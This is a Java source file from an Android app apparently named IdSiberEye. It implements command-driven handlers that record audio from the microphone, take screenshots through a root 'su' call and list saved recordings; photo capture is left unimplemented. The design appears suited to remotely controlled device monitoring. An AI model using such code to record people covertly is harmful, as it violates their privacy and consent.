package com.idsiber.eye.handlers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import androidx.core.app.ActivityCompat;

import com.idsiber.eye.CommandResult;

import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Handler untuk media dan recording (audio, foto, video)
 */
public class MediaHandler {
    private static final String TAG = "MediaHandler";
    private Context context;
    private MediaRecorder mediaRecorder;
    private Camera camera;
    private String currentRecordingPath;
    private boolean isRecording = false;

    public MediaHandler(Context context) {
        this.context = context;
    }

    public CommandResult startAudioRecording(JSONObject params) {
        try {
            // Check permissions
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                return new CommandResult(false, "Audio recording permission required", null);
            }

            if (isRecording) {
                return new CommandResult(false, "Recording already in progress", null);
            }

            // Create output directory
            File recordingsDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Recordings");
            if (!recordingsDir.exists()) {
                recordingsDir.mkdirs();
            }

            // Generate filename
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String filename = "audio_" + timestamp + ".3gp";
            currentRecordingPath = new File(recordingsDir, filename).getAbsolutePath();

            // Setup MediaRecorder
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentRecordingPath);

            // Get duration if specified
            int durationSeconds = params.optInt("duration", 0);
            if (durationSeconds > 0) {
                mediaRecorder.setMaxDuration(durationSeconds * 1000);
            }

            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;

            JSONObject result = new JSONObject();
            result.put("recording_path", currentRecordingPath);
            result.put("filename", filename);
            result.put("duration_limit", durationSeconds);

            Log.d(TAG, "Audio recording started: " + currentRecordingPath);
            return new CommandResult(true, "Audio recording started", result.toString());

        } catch (Exception e) {
            cleanup();
            return new CommandResult(false, "Failed to start audio recording: " + e.getMessage(), null);
        }
    }

    public CommandResult stopAudioRecording() {
        try {
            if (!isRecording || mediaRecorder == null) {
                return new CommandResult(false, "No recording in progress", null);
            }

            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;

            // Get file info
            File recordingFile = new File(currentRecordingPath);
            long fileSize = recordingFile.length();

            JSONObject result = new JSONObject();
            result.put("recording_path", currentRecordingPath);
            result.put("file_size", fileSize);
            result.put("file_exists", recordingFile.exists());

            Log.d(TAG, "Audio recording stopped: " + currentRecordingPath);
            return new CommandResult(true, "Audio recording stopped", result.toString());

        } catch (Exception e) {
            cleanup();
            return new CommandResult(false, "Failed to stop audio recording: " + e.getMessage(), null);
        }
    }

    public CommandResult takePhoto(JSONObject params) {
        try {
            // Check camera permission
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                return new CommandResult(false, "Camera permission required", null);
            }

            // Create output directory
            File photosDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Photos");
            if (!photosDir.exists()) {
                photosDir.mkdirs();
            }

            // Generate filename
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String filename = "photo_" + timestamp + ".jpg";
            String photoPath = new File(photosDir, filename).getAbsolutePath();

            // Determine camera to use (front or back)
            String cameraType = params.optString("camera", "back");
            int cameraId = cameraType.equals("front") ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;

            // Find camera
            int numberOfCameras = Camera.getNumberOfCameras();
            int selectedCameraId = -1;
            
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                Camera.getCameraInfo(i, cameraInfo);
                if (cameraInfo.facing == cameraId) {
                    selectedCameraId = i;
                    break;
                }
            }

            if (selectedCameraId == -1) {
                return new CommandResult(false, "Requested camera not available", null);
            }

            // Note: Taking photo requires more complex implementation with Camera2 API or CameraX
            // This is a simplified version that would need proper camera preview and capture implementation
            return new CommandResult(false, "Photo capture requires camera preview implementation", null);

        } catch (Exception e) {
            return new CommandResult(false, "Failed to take photo: " + e.getMessage(), null);
        }
    }

    public CommandResult takeScreenshot() {
        try {
            // Screenshot requires MediaProjection permission (Android 5+) or root access
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                return new CommandResult(false, "Screenshot requires MediaProjection permission or system app privileges", null);
            } else {
                // For older versions, try with shell command (requires root)
                try {
                    String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
                    String filename = "screenshot_" + timestamp + ".png";
                    String screenshotPath = Environment.getExternalStorageDirectory() + "/IdSiberEye/Screenshots/" + filename;
                    
                    // Create directory
                    File screenshotsDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Screenshots");
                    if (!screenshotsDir.exists()) {
                        screenshotsDir.mkdirs();
                    }

                    Process process = Runtime.getRuntime().exec("su -c screencap -p " + screenshotPath);
                    process.waitFor();

                    File screenshotFile = new File(screenshotPath);
                    if (screenshotFile.exists() && screenshotFile.length() > 0) {
                        JSONObject result = new JSONObject();
                        result.put("screenshot_path", screenshotPath);
                        result.put("filename", filename);
                        result.put("file_size", screenshotFile.length());

                        return new CommandResult(true, "Screenshot captured", result.toString());
                    } else {
                        return new CommandResult(false, "Screenshot file not created", null);
                    }
                } catch (Exception rootError) {
                    return new CommandResult(false, "Screenshot requires root access", null);
                }
            }
        } catch (Exception e) {
            return new CommandResult(false, "Failed to take screenshot: " + e.getMessage(), null);
        }
    }

    public CommandResult getRecordingStatus() {
        try {
            JSONObject status = new JSONObject();
            status.put("is_recording", isRecording);
            status.put("current_recording_path", currentRecordingPath != null ? currentRecordingPath : "");
            
            if (isRecording && currentRecordingPath != null) {
                File recordingFile = new File(currentRecordingPath);
                status.put("current_file_size", recordingFile.exists() ? recordingFile.length() : 0);
            }

            return new CommandResult(true, "Recording status retrieved", status.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get recording status: " + e.getMessage(), null);
        }
    }

    public CommandResult listRecordings() {
        try {
            File recordingsDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Recordings");
            
            JSONObject result = new JSONObject();
            
            if (!recordingsDir.exists()) {
                result.put("recordings", new org.json.JSONArray());
                result.put("total_files", 0);
                result.put("total_size", 0);
                return new CommandResult(true, "No recordings found", result.toString());
            }

            File[] files = recordingsDir.listFiles();
            org.json.JSONArray recordings = new org.json.JSONArray();
            long totalSize = 0;

            if (files != null) {
                for (File file : files) {
                    if (file.isFile() && (file.getName().endsWith(".3gp") || file.getName().endsWith(".mp4") || file.getName().endsWith(".wav"))) {
                        JSONObject fileInfo = new JSONObject();
                        fileInfo.put("filename", file.getName());
                        fileInfo.put("path", file.getAbsolutePath());
                        fileInfo.put("size", file.length());
                        fileInfo.put("last_modified", file.lastModified());
                        fileInfo.put("last_modified_readable", new Date(file.lastModified()).toString());
                        
                        recordings.put(fileInfo);
                        totalSize += file.length();
                    }
                }
            }

            result.put("recordings", recordings);
            result.put("total_files", recordings.length());
            result.put("total_size", totalSize);

            return new CommandResult(true, "Found " + recordings.length() + " recordings", result.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to list recordings: " + e.getMessage(), null);
        }
    }

    private void cleanup() {
        try {
            if (mediaRecorder != null) {
                try {
                    mediaRecorder.stop();
                } catch (Exception e) {
                    // Ignore stop errors during cleanup
                }
                mediaRecorder.release();
                mediaRecorder = null;
            }

            if (camera != null) {
                camera.release();
                camera = null;
            }

            isRecording = false;
            currentRecordingPath = null;
        } catch (Exception e) {
            Log.e(TAG, "Error during cleanup", e);
        }
    }

    public void onDestroy() {
        cleanup();
    }
}
